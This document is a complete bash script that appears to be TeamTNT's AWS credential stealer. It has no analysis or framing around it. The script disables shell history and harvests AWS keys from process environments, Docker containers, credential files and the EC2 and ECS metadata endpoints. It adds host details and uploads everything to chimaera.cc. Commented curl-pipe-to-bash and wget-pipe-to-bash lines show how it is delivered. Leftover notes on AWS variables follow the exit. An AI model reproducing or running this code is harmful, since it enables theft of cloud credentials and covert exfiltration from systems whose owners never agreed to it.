#!/bin/bash

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null


# curl -sLk http://chimaera.cc/sh/grab/AWS.sh | bash
# wget -q -O - http://chimaera.cc/sh/grab/AWS.sh | bash

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
export T1O=13

STEALER_OUT="/var/tmp/TeamTNT_AWS_STEALER.txt"

function CHECK_SETUP(){
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi
fi
}

function SETUP_TNT_AWS_STEALER(){
CHECK_SETUP bash bash bash bash
CHECK_SETUP curl curl curl curl
CHECK_SETUP strings binutils binutils binutils
CHECK_SETUP sort coreutils coreutils coreutils
CHECK_SETUP grep grep grep grep

#if [ -d "/etc/.../aws_lock/" ]; then echo "known server! exit!" ; exit ; fi
#mkdir -p /etc/.../aws_lock/ 2>/dev/null 1>/dev/null

}

SETUP_TNT_AWS_STEALER


function CLEANUP(){
unset TNT_AWS_ACCESS_KEY
unset TNT_AWS_SECRET_KEY
unset TNT_AWS_SESSION_TOKEN
unset SYSTEM_ENV
unset DOCKER_ENV
unset ROOT_CRED_FILE
unset USER_CRED_FILE
unset ALL_SYSTEM_ENV
unset ALL_DOCKER_ENV
}





SYSTEM_ENV=$(strings /proc/*/env* | sort -u | grep 'AWS_DEFAULT_REGION\|AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY\|AWS_SESSION_TOKEN')
if [ ! -z "$SYSTEM_ENV" ]; then echo "Systemvariablen" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~' >> $STEALER_OUT
for SYSTEMENV in ${SYSTEM_ENV[@]}; do
echo $SYSTEMENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
fi


if type docker 2>/dev/null 1>/dev/null; then
DOCKER_ENV=$(docker inspect $(docker ps -q) | sort -u | grep 'AWS_DEFAULT_REGION\|AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY\|AWS_SESSION_TOKEN' | sed 's/",//g' | sed 's/ "//g' | sed 's/ //g')
if [ ! -z "$DOCKER_ENV" ]; then echo "Docker Systemvariablen:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
for DOCKERENV in ${DOCKER_ENV[@]}; do
echo $DOCKERENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
fi
fi


ROOT_CRED_FILE=$(cat /root/.aws/credentials 2>/dev/null | grep 'aws_access_key_id\|aws_secret_access_key\|aws_session_token')
if [ ! -z "$ROOT_CRED_FILE" ]; then echo "AWS root CredFiles:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo -e $ROOT_CRED_FILE | sed 's/aws_/\naws_/g' | sed 's/aws_access_key_id/\naws_access_key_id/g' >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi


USER_CRED_FILE=$(cat /home/*/.aws/credentials 2>/dev/null | grep 'aws_access_key_id\|aws_secret_access_key\|aws_session_token')
if [ ! -z "$USER_CRED_FILE" ]; then echo "AWS user CredFiles:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo -e $USER_CRED_FILE | sed 's/aws_/\naws_/g' | sed 's/aws_access_key_id/\naws_access_key_id/g' >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi





if [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ]; then
echo "AWS_SHARED_CREDENTIALS_FILE:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
cat $AWS_SHARED_CREDENTIALS_FILE >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi


if [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
echo "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
curl -sLk http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 

cat $AWS_SHARED_CREDENTIALS_FILE >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi





function GET_META_DATA(){

export TNT_AWS_ACCESS_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'AccessKeyId' | sed 's/  "AccessKeyId" : "/aws_access_key_id = /g' | sed 's/",//g')

if [ ! -z "$TNT_AWS_ACCESS_KEY" ]; then
export TNT_AWS_SECRET_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'SecretAccessKey' | sed 's/  "SecretAccessKey" : "/aws_secret_access_key = /g' | sed 's/",//g')
fi

if [ ! -z "$TNT_AWS_SECRET_KEY" ]; then
export TNT_AWS_SESSION_TOKEN=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'Token' | sed 's/  "Token" : "/aws_session_token = /g' | sed 's/",//g')
fi


if ! ( [ -z "$TNT_AWS_ACCESS_KEY" ] || [ -z "$TNT_AWS_SECRET_KEY" ] || [ -z "$TNT_AWS_SESSION_TOKEN" ] ); then
#sed -i 's/[default]/[default_'$RANDOM']/g' ~/.aws/credentials
echo "AWS_META-DATA CREDS:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo '[default]' >> $STEALER_OUT
echo $TNT_AWS_ACCESS_KEY >> $STEALER_OUT
echo $TNT_AWS_SECRET_KEY >> $STEALER_OUT
echo $TNT_AWS_SESSION_TOKEN >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi

}

GET_META_DATA




function GET_ALL_ENVS(){

ALL_SYSTEM_ENV=$(strings /proc/*/env* | sort -u | grep 'AWS')
if [ ! -z "$ALL_SYSTEM_ENV" ]; then echo "Alle AWS Systemvariablen" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
for ALLSYSTEMENV in ${ALL_SYSTEM_ENV[@]}; do
echo $ALLSYSTEMENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
fi


if type docker 2>/dev/null 1>/dev/null; then
ALL_DOCKER_ENV=$(docker inspect $(docker ps -q) | sort -u | grep 'AWS' | sed 's/",//g' | sed 's/ "//g' | sed 's/ //g')
if [ ! -z "$ALL_DOCKER_ENV" ]; then echo "Docker Systemvariablen:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
for ALLDOCKERENV in ${ALL_DOCKER_ENV[@]}; do
echo $ALLDOCKERENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
fi
fi

}

GET_ALL_ENVS






if [ -f $STEALER_OUT ]; then
rm -f /var/tmp/TNT_AWS.txt 2>/dev/null 1>/dev/null
echo -e '\n\n' >> /var/tmp/TNT_AWS.txt;echo -e '\n\n' >> /var/tmp/TNT_AWS.txt;echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
echo $(curl -sLk ipv4.icanhazip.com) >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
uptime >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
free -h >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
who >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
last >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
lastlog >> /var/tmp/TNT_AWS.txt && echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
echo -e '\n\n' >> /var/tmp/TNT_AWS.txt;echo -e '\n\n' >> /var/tmp/TNT_AWS.txt;echo -e '\n\n' >> /var/tmp/TNT_AWS.txt
cat $STEALER_OUT >> /var/tmp/TNT_AWS.txt
rm -f $STEALER_OUT 2>/dev/null 1>/dev/null
#cat /var/tmp/TNT_AWS.txt
curl -F 'userfile=@/var/tmp/TNT_AWS.txt' http://chimaera.cc/in/AWS.php
rm -f /var/tmp/TNT_AWS.txt 2>/dev/null 1>/dev/null
fi


CLEANUP
exit














AWS_CREDS_FILE_ARRAY=("creds.json")


# configuration.json	AKID
# creds.json			AWS,AMAZON



#AWS_CONFIG_FILE
#AWS_SHARED_CREDENTIALS_FILE

ECS_CONTAINER_METADATA_URI
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

AWS_DEFAULT_REGION
AWS_CA_BUNDLE
AWS_CLI_AUTO_PROMPT
AWS_CLI_FILE_ENCODING
AWS_DEFAULT_OUTPUT
AWS_EC2_METADATA_DISABLED
AWS_MAX_ATTEMPTS
AWS_PAGER
AWS_PROFILE
AWS_RETRY_MODE
AWS_ROLE_SESSION_NAME
AWS_STS_REGIONAL_ENDPOINTS

ECS_ENABLE_TASK_IAM_ROLE
ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST








~~~~~~~~~~~~~~~~~~~~~~~~~
AWS_CONTAINER_CREDENTIALS_FULL_URI
AWS_CONTAINER_AUTHORIZATION_TOKEN


curl -s -H "X-aws-ec2-metadata-token: $AWS_CONTAINER_AUTHORIZATION_TOKEN"\
$AWS_CONTAINER_CREDENTIALS_FULL_URI | jq "{AccessKeyId: .AccessKeyId, SecretAccessKey: .SecretAccessKey, SessionToken: .Token, Expiration: .Expiration, Version: 1"}
